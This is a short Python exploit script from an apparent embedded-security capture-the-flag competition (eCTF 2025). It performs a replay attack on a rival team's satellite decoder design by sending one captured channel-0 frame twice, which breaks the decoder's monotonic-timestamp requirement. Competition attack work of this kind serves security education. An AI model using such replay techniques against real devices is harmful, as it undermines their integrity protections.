"""Pesky Neighbor attack for tufts
@author: Gavin Zhong, Liz Grzyb
@description: CAT bypasses the timestamp check for channel 0, so by simply replaying lgmt channel 0 frame,
we can make it violate security requirement 3 (monotonically increasing timestamps)
"""

import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_0() -> bytes:
    """Liz Grzyb
        simply replay lgmt channel 0 frame
    """
    lgmt_frame_channel0 = b'\x00\x00\x00\x00\x0b\xa8\x9e\x8d\x985\x05\x00@\x17y\x84\x7f\x94\xd5>\x06\x9b\x92\xfd\n\xd4F\x8f\x13\xb1V\x1eB\x12B]\x81XM\x12\xc2hqgs\x1c\x12\xe5\x0e\x1d\xa3%+\xd6\xa7O9\x92\x00\xfeV6\x83Vx\xc8=\x87\x9b\xc3R\xc5\xb5\x965\xcf\xb1\xb2\xc6\x17\x97\x8a\xa4\x88%\xfa\x05\x97\xe79,\x16'
    return lgmt_frame_channel0


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_0())
    interface.decode(lgmt_channel_0())

    print("Done with pesky Neighbor attack")
